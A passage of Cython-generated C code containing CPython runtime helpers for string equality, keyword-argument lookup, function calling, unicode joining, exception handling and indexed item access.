res;\n}\n#endif\n\n\nstatic CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {\n#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API || CYTHON_COMPILING_IN_GRAAL ||\\\n        !(CYTHON_ASSUME_SAFE_SIZE && CYTHON_ASSUME_SAFE_MACROS)\n    return PyObject_RichCompareBool(s1, s2, equals);\n#else\n    if (s1 == s2) {\n        return (equals == Py_EQ);\n    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {\n        const char *ps1, *ps2;\n        Py_ssize_t length = PyBytes_GET_SIZE(s1);\n        if (length != PyBytes_GET_SIZE(s2))\n            return (equals == Py_NE);\n        ps1 = PyBytes_AS_STRING(s1);\n        ps2 = PyBytes_AS_STRING(s2);\n        if (ps1[0] != ps2[0]) {\n            return (equals == Py_NE);\n        } else if (length == 1) {\n            return (equals == Py_EQ);\n        } else {\n            int result;\n#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)\n            Py_hash_t hash1, hash2;\n            hash1 = ((PyBytesObject*)s1)->ob_shash;\n            hash2 = ((PyBytesObject*)s2)->ob_shash;\n            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {\n                return (equals == Py_NE);\n            }\n#endif\n            result = memcmp(ps1, ps2, (size_t)length);\n            return (equals == Py_EQ) ? (result == 0) : (result != 0);\n        }\n    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {\n        return (equals == Py_NE);\n    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {\n        return (equals == Py_NE);\n    } else {\n        int result;\n        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);\n        if (!py_result)\n            return -1;\n        result = __Pyx_PyObject_IsTrue(py_result);\n        Py_DECREF(py_result);\n        return result;\n    }\n#endif\n}\n\n\nstatic CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {\n#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API || CYTHON_COMPILING_IN_GRAAL\n    return PyObject_RichCompareBool(s1, s2, equals);\n#else\n    int s1_is_unicode, s2_is_unicode;\n    if (s1 == s2) {\n        goto return_eq;\n    }\n    s1_is_unicode = PyUnicode_CheckExact(s1);\n    s2_is_unicode = PyUnicode_CheckExact(s2);\n    if (s1_is_unicode & s2_is_unicode) {\n        Py_ssize_t length, length2;\n        int kind;\n        void *data1, *data2;\n        #if !CYTHON_COMPILING_IN_LIMITED_API\n        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))\n            return -1;\n        #endif\n        length = __Pyx_PyUnicode_GET_LENGTH(s1);\n        #if !CYTHON_ASSUME_SAFE_SIZE\n        if (unlikely(length < 0)) return -1;\n        #endif\n        length2 = __Pyx_PyUnicode_GET_LENGTH(s2);\n        #if !CYTHON_ASSUME_SAFE_SIZE\n        if (unlikely(length2 < 0)) return -1;\n        #endif\n        if (length != length2) {\n            goto return_ne;\n        }\n#if CYTHON_USE_UNICODE_INTERNALS\n        {\n            Py_hash_t hash1, hash2;\n            hash1 = ((PyASCIIObject*)s1)->hash;\n            hash2 = ((PyASCIIObject*)s2)->hash;\n            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {\n                goto return_ne;\n            }\n        }\n#endif\n        kind = __Pyx_PyUnicode_KIND(s1);\n        if (kind != __Pyx_PyUnicode_KIND(s2)) {\n            goto return_ne;\n        }\n        data1 = __Pyx_PyUnicode_DATA(s1);\n        data2 = __Pyx_PyUnicode_DATA(s2);\n        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {\n            goto return_ne;\n        } else if (length == 1) {\n            goto return_eq;\n        } else {\n            int result = memcmp(data1, data2, (size_t)(length * kind));\n            return (equals == Py_EQ) ? (result == 0) : (result != 0);\n        }\n    } else if ((s1 == Py_None) & s2_is_unicode) {\n        goto return_ne;\n    } else if ((s2 == Py_None) & s1_is_unicode) {\n        goto return_ne;\n    } else {\n        int result;\n        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);\n        if (!py_result)\n            return -1;\n        result = __Pyx_PyObject_IsTrue(py_result);\n        Py_DECREF(py_result);\n        return result;\n    }\nreturn_eq:\n    return (equals == Py_EQ);\nreturn_ne:\n    return (equals == Py_NE);\n#endif\n}\n\n\n#if CYTHON_METH_FASTCALL\nstatic CYTHON_INLINE PyObject * __Pyx_GetKwValue_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues, PyObject *s)\n{\n    Py_ssize_t i, n = __Pyx_PyTuple_GET_SIZE(kwnames);\n    #if !CYTHON_ASSUME_SAFE_SIZE\n    if (unlikely(n == -1)) return NULL;\n    #endif\n    for (i = 0; i < n; i++)\n    {\n        PyObject *namei = __Pyx_PyTuple_GET_ITEM(kwnames, i);\n        #if !CYTHON_ASSUME_SAFE_MACROS\n        if (unlikely(!namei)) return NULL;\n        #endif\n        if (s == namei) return kwvalues[i];\n    }\n    for (i = 0; i < n; i++)\n    {\n        PyObject *namei = __Pyx_PyTuple_GET_ITEM(kwnames, i);\n        #if !CYTHON_ASSUME_SAFE_MACROS\n        if (unlikely(!namei)) return NULL;\n        #endif\n        int eq = __Pyx_PyUnicode_Equals(s, namei, Py_EQ);\n        if (unlikely(eq != 0)) {\n            if (unlikely(eq < 0)) return NULL;\n            return kwvalues[i];\n        }\n    }\n    return NULL;\n}\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030d0000 || CYTHON_COMPILING_IN_LIMITED_API\nCYTHON_UNUSED static PyObject *__Pyx_KwargsAsDict_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues) {\n    Py_ssize_t i, nkwargs;\n    PyObject *dict;\n#if !CYTHON_ASSUME_SAFE_SIZE\n    nkwargs = PyTuple_Size(kwnames);\n    if (unlikely(nkwargs < 0)) return NULL;\n#else\n    nkwargs = PyTuple_GET_SIZE(kwnames);\n#endif\n    dict = PyDict_New();\n    if (unlikely(!dict))\n        return NULL;\n    for (i=0; i<nkwargs; i++) {\n#if !CYTHON_ASSUME_SAFE_MACROS\n        PyObject *key = PyTuple_GetItem(kwnames, i);\n        if (!key) goto bad;\n#else\n        PyObject *key = PyTuple_GET_ITEM(kwnames, i);\n#endif\n        if (unlikely(PyDict_SetItem(dict, key, kwvalues[i]) < 0))\n            goto bad;\n    }\n    return dict;\nbad:\n    Py_DECREF(dict);\n    return NULL;\n}\n#endif\n#endif\n\n\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\n    PyObject **dictptr = NULL;\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\n    if (offset) {\n#if CYTHON_COMPILING_IN_CPYTHON\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\n#else\n        dictptr = _PyObject_GetDictPtr(obj);\n#endif\n    }\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\n}\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\n        return 0;\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\n}\n#endif\n\n\n#if CYTHON_USE_DICT_VERSIONS\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\n#else\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\n#endif\n{\n    PyObject *result;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    if (unlikely(!__pyx_m)) {\n        if (!PyErr_Occurred())\n            PyErr_SetNone(PyExc_NameError);\n        return NULL;\n    }\n    result = PyObject_GetAttr(__pyx_m, name);\n    if (likely(result)) {\n        return result;\n    }\n    PyErr_Clear();\n#elif CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n    if (unlikely(__Pyx_PyDict_GetItemRef(__pyx_mstate_global->__pyx_d, name, &result) == -1)) PyErr_Clear();\n    __PYX_UPDATE_DICT_CACHE(__pyx_mstate_global->__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return result;\n    }\n#else\n    result = _PyDict_GetItem_KnownHash(__pyx_mstate_global->__pyx_d, name, ((PyASCIIObject *) name)->hash);\n    __PYX_UPDATE_DICT_CACHE(__pyx_mstate_global->__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n    PyErr_Clear();\n#endif\n    return __Pyx_GetBuiltinName(name);\n}\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *result;\n    ternaryfunc call = Py_TYPE(func)->tp_call;\n    if (unlikely(!call))\n        return PyObject_Call(func, arg, kw);\n    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object")))\n        return NULL;\n    result = (*call)(func, arg, kw);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            "NULL result without error in PyObject_Call");\n    }\n    return result;\n}\n#endif\n\n\nstatic PyObject* __Pyx_PyUnicode_Join(PyObject** values, Py_ssize_t value_count, Py_ssize_t result_ulength,\n                                      Py_UCS4 max_char) {\n#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n    PyObject *result_uval;\n    int result_ukind, kind_shift;\n    Py_ssize_t i, char_pos;\n    void *result_udata;\n    if (max_char > 1114111) max_char = 1114111;\n    result_uval = PyUnicode_New(result_ulength, max_char);\n    if (unlikely(!result_uval)) return NULL;\n    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;\n    kind_shift = (result_ukind == PyUnicode_4BYTE_KIND) ? 2 : result_ukind - 1;\n    result_udata = PyUnicode_DATA(result_uval);\n    assert(kind_shift == 2 || kind_shift == 1 || kind_shift == 0);\n    if (unlikely((PY_SSIZE_T_MAX >> kind_shift) - result_ulength < 0))\n        goto overflow;\n    char_pos = 0;\n    for (i=0; i < value_count; i++) {\n        int ukind;\n        Py_ssize_t ulength;\n        void *udata;\n        PyObject *uval = values[i];\n        #if !CYTHON_COMPILING_IN_LIMITED_API\n        if (__Pyx_PyUnicode_READY(uval) == (-1))\n            goto bad;\n        #endif\n        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);\n        #if !CYTHON_ASSUME_SAFE_SIZE\n        if (unlikely(ulength < 0)) goto bad;\n        #endif\n        if (unlikely(!ulength))\n            continue;\n        if (unlikely((PY_SSIZE_T_MAX >> kind_shift) - ulength < char_pos))\n            goto overflow;\n        ukind = __Pyx_PyUnicode_KIND(uval);\n        udata = __Pyx_PyUnicode_DATA(uval);\n        if (ukind == result_ukind) {\n            memcpy((char *)result_udata + (char_pos << kind_shift), udata, (size_t) (ulength << kind_shift));\n        } else {\n            #if PY_VERSION_HEX >= 0x030d0000\n            if (unlikely(PyUnicode_CopyCharacters(result_uval, char_pos, uval, 0, ulength) < 0)) goto bad;\n            #elif CYTHON_COMPILING_IN_CPYTHON || defined(_PyUnicode_FastCopyCharacters)\n            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);\n            #else\n            Py_ssize_t j;\n            for (j=0; j < ulength; j++) {\n                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);\n                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);\n            }\n            #endif\n        }\n        char_pos += ulength;\n    }\n    return result_uval;\noverflow:\n    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");\nbad:\n    Py_DECREF(result_uval);\n    return NULL;\n#else\n    Py_ssize_t i;\n    PyObject *result = NULL;\n    PyObject *value_tuple = PyTuple_New(value_count);\n    if (unlikely(!value_tuple)) return NULL;\n    CYTHON_UNUSED_VAR(max_char);\n    CYTHON_UNUSED_VAR(result_ulength);\n    for (i=0; i<value_count; i++) {\n        if (__Pyx_PyTuple_SET_ITEM(value_tuple, i, values[i]) != (0)) goto bad;\n        Py_INCREF(values[i]);\n    }\n    result = PyUnicode_Join(__pyx_mstate_global->__pyx_empty_unicode, value_tuple);\nbad:\n    Py_DECREF(value_tuple);\n    return result;\n#endif\n}\n\n\n#if CYTHON_FAST_PYCALL && !CYTHON_VECTORCALL\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject *const *args, Py_ssize_t na,\n                                               PyObject *globals) {\n    PyFrameObject *f;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject **fastlocals;\n    Py_ssize_t i;\n    PyObject *result;\n    assert(globals != NULL);\n    \n    assert(tstate != NULL);\n    f = PyFrame_New(tstate, co, globals, NULL);\n    if (f == NULL) {\n        return NULL;\n    }\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\n    for (i = 0; i < na; i++) {\n        Py_INCREF(*args);\n        fastlocals[i] = *args++;\n    }\n    result = PyEval_EvalFrameEx(f,0);\n    ++tstate->recursion_depth;\n    Py_DECREF(f);\n    --tstate->recursion_depth;\n    return result;\n}\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject *const *args, Py_ssize_t nargs, PyObject *kwargs) {\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\n    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);\n    PyObject *closure;\n    PyObject *kwdefs;\n    PyObject *kwtuple, **k;\n    PyObject **d;\n    Py_ssize_t nd;\n    Py_ssize_t nk;\n    PyObject *result;\n    assert(kwargs == NULL || PyDict_Check(kwargs));\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\n    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object"))) {\n        return NULL;\n    }\n    if (\n            co->co_kwonlyargcount == 0 &&\n            likely(kwargs == NULL || nk == 0) &&\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {\n        if (argdefs == NULL && co->co_argcount == nargs) {\n            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);\n            goto done;\n        }\n        else if (nargs == 0 && argdefs != NULL\n                 && co->co_argcount == Py_SIZE(argdefs)) {\n            \n            args = &PyTuple_GET_ITEM(argdefs, 0);\n            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);\n            goto done;\n        }\n    }\n    if (kwargs != NULL) {\n        Py_ssize_t pos, i;\n        kwtuple = PyTuple_New(2 * nk);\n        if (kwtuple == NULL) {\n            result = NULL;\n            goto done;\n        }\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\n        pos = i = 0;\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\n            Py_INCREF(k[i]);\n            Py_INCREF(k[i+1]);\n            i += 2;\n        }\n        nk = i / 2;\n    }\n    else {\n        kwtuple = NULL;\n        k = NULL;\n    }\n    closure = PyFunction_GET_CLOSURE(func);\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\n    if (argdefs != NULL) {\n        d = &PyTuple_GET_ITEM(argdefs, 0);\n        nd = Py_SIZE(argdefs);\n    }\n    else {\n        d = NULL;\n        nd = 0;\n    }\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, kwdefs, closure);\n    Py_XDECREF(kwtuple);\ndone:\n    Py_LeaveRecursiveCall();\n    return result;\n}\n#endif\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\n    PyObject *self, *result;\n    PyCFunction cfunc;\n    cfunc = __Pyx_CyOrPyCFunction_GET_FUNCTION(func);\n    self = __Pyx_CyOrPyCFunction_GET_SELF(func);\n    if (unlikely(Py_EnterRecursiveCall(" while calling a Python object")))\n        return NULL;\n    result = cfunc(self, arg);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            "NULL result without error in PyObject_Call");\n    }\n    return result;\n}\n#endif\n\n\n#if PY_VERSION_HEX < 0x03090000 || CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject* __Pyx_PyObject_FastCall_fallback(PyObject *func, PyObject * const*args, size_t nargs, PyObject *kwargs) {\n    PyObject *argstuple;\n    PyObject *result = 0;\n    size_t i;\n    argstuple = PyTuple_New((Py_ssize_t)nargs);\n    if (unlikely(!argstuple)) return NULL;\n    for (i = 0; i < nargs; i++) {\n        Py_INCREF(args[i]);\n        if (__Pyx_PyTuple_SET_ITEM(argstuple, (Py_ssize_t)i, args[i]) != (0)) goto bad;\n    }\n    result = __Pyx_PyObject_Call(func, argstuple, kwargs);\n  bad:\n    Py_DECREF(argstuple);\n    return result;\n}\n#endif\n#if CYTHON_VECTORCALL && !CYTHON_COMPILING_IN_LIMITED_API\n  #if PY_VERSION_HEX < 0x03090000\n    #define __Pyx_PyVectorcall_Function(callable) _PyVectorcall_Function(callable)\n  #elif CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE vectorcallfunc __Pyx_PyVectorcall_Function(PyObject *callable) {\n    PyTypeObject *tp = Py_TYPE(callable);\n    #if defined(__Pyx_CyFunction_USED)\n    if (__Pyx_CyFunction_CheckExact(callable)) {\n        return __Pyx_CyFunction_func_vectorcall(callable);\n    }\n    #endif\n    if (!PyType_HasFeature(tp, Py_TPFLAGS_HAVE_VECTORCALL)) {\n        return NULL;\n    }\n    assert(PyCallable_Check(callable));\n    Py_ssize_t offset = tp->tp_vectorcall_offset;\n    assert(offset > 0);\n    vectorcallfunc ptr;\n    memcpy(&ptr, (char *) callable + offset, sizeof(ptr));\n    return ptr;\n}\n  #else\n    #define __Pyx_PyVectorcall_Function(callable) PyVectorcall_Function(callable)\n  #endif\n#endif\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject *const *args, size_t _nargs, PyObject *kwargs) {\n    Py_ssize_t nargs = __Pyx_PyVectorcall_NARGS(_nargs);\n#if CYTHON_COMPILING_IN_CPYTHON\n    if (nargs == 0 && kwargs == NULL) {\n        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_NOARGS))\n            return __Pyx_PyObject_CallMethO(func, NULL);\n    }\n    else if (nargs == 1 && kwargs == NULL) {\n        if (__Pyx_CyOrPyCFunction_Check(func) && likely( __Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_O))\n            return __Pyx_PyObject_CallMethO(func, args[0]);\n    }\n#endif\n    #if PY_VERSION_HEX < 0x030800B1\n    #if CYTHON_FAST_PYCCALL\n    if (PyCFunction_Check(func)) {\n        if (kwargs) {\n            return _PyCFunction_FastCallDict(func, args, nargs, kwargs);\n        } else {\n            return _PyCFunction_FastCallKeywords(func, args, nargs, NULL);\n        }\n    }\n    if (!kwargs && __Pyx_IS_TYPE(func, &PyMethodDescr_Type)) {\n        return _PyMethodDescr_FastCallKeywords(func, args, nargs, NULL);\n    }\n    #endif\n    #if CYTHON_FAST_PYCALL\n    if (PyFunction_Check(func)) {\n        return __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs);\n    }\n    #endif\n    #endif\n    if (kwargs == NULL) {\n        #if CYTHON_VECTORCALL && !CYTHON_COMPILING_IN_LIMITED_API\n        vectorcallfunc f = __Pyx_PyVectorcall_Function(func);\n        if (f) {\n            return f(func, args, _nargs, NULL);\n        }\n        #elif defined(__Pyx_CyFunction_USED) && CYTHON_BACKPORT_VECTORCALL\n        if (__Pyx_CyFunction_CheckExact(func)) {\n            __pyx_vectorcallfunc f = __Pyx_CyFunction_func_vectorcall(func);\n            if (f) return f(func, args, _nargs, NULL);\n        }\n        #elif CYTHON_COMPILING_IN_LIMITED_API && CYTHON_VECTORCALL\n        return PyObject_Vectorcall(func, args, _nargs, NULL);\n        #endif\n    }\n    if (nargs == 0) {\n        return __Pyx_PyObject_Call(func, __pyx_mstate_global->__pyx_empty_tuple, kwargs);\n    }\n    #if PY_VERSION_HEX >= 0x03090000 && !CYTHON_COMPILING_IN_LIMITED_API\n    return PyObject_VectorcallDict(func, args, (size_t)nargs, kwargs);\n    #else\n    return __Pyx_PyObject_FastCall_fallback(func, args, (size_t)nargs, kwargs);\n    #endif\n}\n\n\n#if !CYTHON_VECTORCALL || PY_VERSION_HEX < 0x03090000\nstatic PyObject *__Pyx_PyObject_FastCallMethod(PyObject *name, PyObject *const *args, size_t nargsf) {\n    PyObject *result;\n    PyObject *attr = PyObject_GetAttr(args[0], name);\n    if (unlikely(!attr))\n        return NULL;\n    result = __Pyx_PyObject_FastCall(attr, args+1, nargsf - 1);\n    Py_DECREF(attr);\n    return result;\n}\n#endif\n\n\nstatic void __Pyx_RaiseUnboundLocalError(const char *varname) {\n    PyErr_Format(PyExc_UnboundLocalError, "local variable \'%s\' referenced before assignment", varname);\n}\n\n\n#if CYTHON_FAST_THREAD_STATE\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)\n#endif\n{\n    PyObject *local_type = NULL, *local_value, *local_tb = NULL;\n#if CYTHON_FAST_THREAD_STATE\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n  #if PY_VERSION_HEX >= 0x030C0000\n    local_value = tstate->current_exception;\n    tstate->current_exception = 0;\n  #else\n    local_type = tstate->curexc_type;\n    local_value = tstate->curexc_value;\n    local_tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n  #endif\n#elif __PYX_LIMITED_VERSION_HEX > 0x030C0000\n    local_value = PyErr_GetRaisedException();\n#else\n    PyErr_Fetch(&local_type, &local_value, &local_tb);\n#endif\n#if __PYX_LIMITED_VERSION_HEX > 0x030C0000\n    if (likely(local_value)) {\n        local_type = (PyObject*) Py_TYPE(local_value);\n        Py_INCREF(local_type);\n        local_tb = PyException_GetTraceback(local_value);\n    }\n#else\n    PyErr_NormalizeException(&local_type, &local_value, &local_tb);\n#if CYTHON_FAST_THREAD_STATE\n    if (unlikely(tstate->curexc_type))\n#else\n    if (unlikely(PyErr_Occurred()))\n#endif\n        goto bad;\n    if (local_tb) {\n        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))\n            goto bad;\n    }\n#endif // __PYX_LIMITED_VERSION_HEX > 0x030C0000\n    Py_XINCREF(local_tb);\n    Py_XINCREF(local_type);\n    Py_XINCREF(local_value);\n    *type = local_type;\n    *value = local_value;\n    *tb = local_tb;\n#if CYTHON_FAST_THREAD_STATE\n    #if CYTHON_USE_EXC_INFO_STACK\n    {\n        _PyErr_StackItem *exc_info = tstate->exc_info;\n      #if PY_VERSION_HEX >= 0x030B00a4\n        tmp_value = exc_info->exc_value;\n        exc_info->exc_value = local_value;\n        tmp_type = NULL;\n        tmp_tb = NULL;\n        Py_XDECREF(local_type);\n        Py_XDECREF(local_tb);\n      #else\n        tmp_type = exc_info->exc_type;\n        tmp_value = exc_info->exc_value;\n        tmp_tb = exc_info->exc_traceback;\n        exc_info->exc_type = local_type;\n        exc_info->exc_value = local_value;\n        exc_info->exc_traceback = local_tb;\n      #endif\n    }\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = local_type;\n    tstate->exc_value = local_value;\n    tstate->exc_traceback = local_tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n#elif __PYX_LIMITED_VERSION_HEX >= 0x030b0000\n    PyErr_SetHandledException(local_value);\n    Py_XDECREF(local_value);\n    Py_XDECREF(local_type);\n    Py_XDECREF(local_tb);\n#else\n    PyErr_SetExcInfo(local_type, local_value, local_tb);\n#endif\n    return 0;\n#if __PYX_LIMITED_VERSION_HEX <= 0x030C0000\nbad:\n    *type = 0;\n    *value = 0;\n    *tb = 0;\n    Py_XDECREF(local_type);\n    Py_XDECREF(local_value);\n    Py_XDECREF(local_tb);\n    return -1;\n#endif\n}\n\n\nstatic void __Pyx_Generator_Replace_StopIteration(int in_async_gen) {\n    PyObject *exc, *val, *tb, *cur_exc, *new_exc;\n    __Pyx_PyThreadState_declare\n    int is_async_stopiteration = 0;\n    CYTHON_MAYBE_UNUSED_VAR(in_async_gen);\n    __Pyx_PyThreadState_assign\n    cur_exc = __Pyx_PyErr_CurrentExceptionType();\n    if (likely(!__Pyx_PyErr_GivenExceptionMatches(cur_exc, PyExc_StopIteration))) {\n        if (in_async_gen && unlikely(__Pyx_PyErr_GivenExceptionMatches(cur_exc, PyExc_StopAsyncIteration))) {\n            is_async_stopiteration = 1;\n        } else {\n            return;\n        }\n    }\n    __Pyx_GetException(&exc, &val, &tb);\n    Py_XDECREF(exc);\n    Py_XDECREF(tb);\n    new_exc = PyObject_CallFunction(PyExc_RuntimeError, "s",\n        is_async_stopiteration ? "async generator raised StopAsyncIteration" :\n        in_async_gen ? "async generator raised StopIteration" :\n        "generator raised StopIteration");\n    if (!new_exc) {\n        Py_XDECREF(val);\n        return;\n    }\n    PyException_SetCause(new_exc, val); // steals ref to val\n    PyErr_SetObject(PyExc_RuntimeError, new_exc);\n}\n\n\n#if CYTHON_VECTORCALL\nstatic int __Pyx_VectorcallBuilder_AddArg(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n) {\n    (void)__Pyx_PyObject_FastCallDict;\n    if (__Pyx_PyTuple_SET_ITEM(builder, n, key) != (0)) return -1;\n    Py_INCREF(key);\n    args[n] = value;\n    return 0;\n}\nCYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n) {\n    (void)__Pyx_VectorcallBuilder_AddArgStr;\n    if (unlikely(!PyUnicode_Check(key))) {\n        PyErr_SetString(PyExc_TypeError, "keywords must be strings");\n        return -1;\n    }\n    return __Pyx_VectorcallBuilder_AddArg(key, value, builder, args, n);\n}\nstatic int __Pyx_VectorcallBuilder_AddArgStr(const char *key, PyObject *value, PyObject *builder, PyObject **args, int n) {\n    PyObject *pyKey = PyUnicode_FromString(key);\n    if (!pyKey) return -1;\n    return __Pyx_VectorcallBuilder_AddArg(pyKey, value, builder, args, n);\n}\n#else // CYTHON_VECTORCALL\nCYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, CYTHON_UNUSED PyObject **args, CYTHON_UNUSED int n) {\n    if (unlikely(!PyUnicode_Check(key))) {\n        PyErr_SetString(PyExc_TypeError, "keywords must be strings");\n        return -1;\n    }\n    return PyDict_SetItem(builder, key, value);\n}\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_Unicode(PyObject *obj) {\n    if (unlikely(obj == Py_None))\n        obj = __pyx_mstate_global->__pyx_kp_u_None;\n    return __Pyx_NewRef(obj);\n}\n\n\nstatic PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {\n    PyObject *r;\n    if (unlikely(!j)) return NULL;\n    r = PyObject_GetItem(o, j);\n    Py_DECREF(j);\n    return r;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\n                                                              CYTHON_NCP_UNUSED int wraparound,\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && CYTHON_ASSUME_SAFE_SIZE && !CYTHON_AVOID_BORROWED_REFS && !CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n    Py_ssize_t wrapped_i = i;\n    if (wraparound & unlikely(i < 0)) {\n        wrapped_i += PyList_GET_SIZE(o);\n    }\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {\n        PyObject *r = PyList_GET_ITEM(o, wrapped_i);\n        Py_INCREF(r);\n        return r;\n    }\n    return __Pyx_GetItemInt_Generic(o, PyLong_FromSsize_t(i));\n#else\n    return PySequence_GetItem(o, i);\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\n                                                              CYTHON_NCP_UNUSED int wraparound,\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && CYTHON_ASSUME_SAFE_SIZE && !CYTHON_AVOID_BORROWED_REFS\n    Py_ssize_t wrapped_i = i;\n    if (wraparound & unlikely(i < 0)) {\n        wrapped_i += 